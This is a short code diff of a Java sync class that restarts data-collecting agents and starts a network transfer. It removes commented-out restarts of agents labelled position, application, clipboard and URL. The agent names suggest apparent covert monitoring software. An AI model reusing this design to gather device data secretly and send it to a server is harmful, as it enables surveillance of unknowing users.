@@ -127,12 +127,6 @@ public class SyncActionInternet extends SubAction {
         transferInit();
 
         // Stop degli agenti che producono un singolo log
-
-        //agentManager.reStart(Agent.AGENT_POSITION);
-        //agentManager.reStart(Agent.AGENT_APPLICATION);
-
-        //agentManager.reStart(Agent.AGENT_CLIPBOARD);
-        //agentManager.reStart(Agent.AGENT_URL);
         agentManager.reStart(Agent.AGENT_DEVICE);
 
         Utils.sleep(500);
@@ -165,12 +159,10 @@ public class SyncActionInternet extends SubAction {
         //#endif
 
         return false;
-
     }
 
     protected void transferInit() {
         transfer.init(host, port, ssl, wifiForced, wifi, gprs);
-
     }
 
     /*
